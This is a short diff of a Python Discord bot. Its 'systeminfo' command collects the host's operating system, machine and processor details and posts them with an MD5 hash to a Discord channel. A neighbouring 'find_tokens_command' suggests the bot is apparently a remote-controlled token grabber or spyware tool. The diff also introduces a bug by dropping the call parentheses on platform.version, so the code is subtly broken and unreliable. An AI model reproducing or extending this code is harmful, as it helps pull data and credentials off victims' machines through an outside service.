@@ -151,14 +151,14 @@ async def find_tokens_command(ctx):
 @bot.command(name='systeminfo')
 async def system_info(ctx):
     try:
-        system_info = f"System: {platform.system()} {platform.version()}\n"
+        system_info = f"System: {platform.system()} {platform.version}\n"
         system_info += f"Machine: {platform.machine()}\n"
         system_info += f"Processor: {platform.processor()}"
 
         hash_object = hashlib.md5(system_info.encode())
         system_hash = hash_object.hexdigest()
 
-        await ctx.send(f"System Information:\n```\n{system_info}\n```\nSystem Hash: {system_hash}")
+        await ctx.send(f"""```\n{system_info}\n || System Hash: {system_hash}```""")
     except Exception as e:
         await ctx.send(f'Error getting system information:\n```\n{e}\n```')
 
